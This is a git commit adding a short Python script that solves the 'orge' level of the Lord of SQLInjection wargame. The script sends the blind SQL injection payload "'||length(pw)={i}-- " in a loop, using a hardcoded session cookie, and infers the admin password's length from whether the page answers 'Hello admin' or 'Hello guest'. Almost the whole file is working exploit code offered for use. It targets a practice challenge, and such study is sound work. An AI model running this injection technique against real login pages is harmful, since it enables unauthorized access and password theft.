ef57adb600bb71b5fd2f7b34544dfddea3733eef
5thofnovmbr <69567640+5thofnovmbr@users.noreply.github.com>
2020-08-14 21:59:48 +0900

    Create los_orge_pw_length.py

---
+++ los_orge_pw_length.py
@@ -0,0 +1,14 @@
+import requests as req 
+
+url="https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php"
+ck={"PHPSESSID":"849ve51c014kir7maol24mfnf8"}
+
+for i in range(100):
+	params = {"pw":f"'||length(pw)={i}-- "}
+	with req.get(url, params=params, cookies=ck) as res:
+		if "Hello admin" in res.text:
+			print("Hello admin",i)
+		elif "Hello guest" in res.text:
+			print("Hello guest",i)
+			break
+			# admin의 pw가 더 긴걸 확인해서 break사용 
